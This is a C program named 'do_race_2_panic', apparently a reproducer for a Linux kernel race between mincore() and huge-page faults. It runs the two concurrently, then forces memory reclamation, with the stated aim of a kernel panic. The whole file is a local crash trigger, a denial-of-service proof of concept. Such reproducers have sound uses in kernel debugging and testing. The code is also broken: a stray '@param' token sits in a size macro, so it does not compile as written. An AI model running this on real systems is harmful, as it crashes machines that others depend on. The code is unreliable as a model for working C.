/*
 * program 'do_race_2_panic'
 * compile with: cc do_race_2_panic.c -lpthread -o do_race_2_panic
 */
#include <sys/mman.h>
#include <pthread.h>
#include <strings.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

#define  PAGE_SIZE       (size_t)(4096)
#define  HUGE_PAGE_SIZE  (size_t)(PAGE_SIZE * 512)
#define  MEM_ALLOC_SIZE  (size_t)(HUGE_PAGE_SIZE * @param)

int  race_done = 0;
void *mem_addr = (void *)NULL;

void *do_mincore(void *unused)
{
    char vec[1];

    while (!race_done) {
        if (mem_addr) {
            if (mincore(mem_addr, PAGE_SIZE, vec) == -1) {
                printf("mincore: errno=%d\n", errno);
                _exit(1);
            }
        }
    }
    return NULL;
}

void do_page_fault()
{
    int i;

    for (i = 0; i < MEM_ALLOC_SIZE; i += HUGE_PAGE_SIZE) {
        *((char *)mem_addr) = '\0';
        mem_addr += HUGE_PAGE_SIZE;
    }
    race_done = 1;
}

do_reclaim()
{
    mem_addr = malloc(MEM_ALLOC_SIZE);
    if (!mem_addr) {
        printf("malloc: errno=%d\n", errno);
        _exit(1);
    }
    bzero(mem_addr, MEM_ALLOC_SIZE);
}

main()
{
    pthread_t pt;
    int ret;

    /* allocate a shared area for concurrent page fault / mincore() */
    ret = posix_memalign(&mem_addr, HUGE_PAGE_SIZE, MEM_ALLOC_SIZE);
    if (ret) {
        printf("posix_memalign: ret=%d\n", ret);
        _exit(1);
    }

    /* start a separate thread that does mincore() on the shared area */
    ret = pthread_create(&pt, NULL, do_mincore, NULL);
    if (ret) {
        printf("pthread_create: ret=%d\n", ret);
        _exit(1);
    }

    /* force page faults on the shared area in parallel to mincore() */
    do_page_fault();

    /* allocate and initialize a huge area to force page reclamation */
    do_reclaim();
}
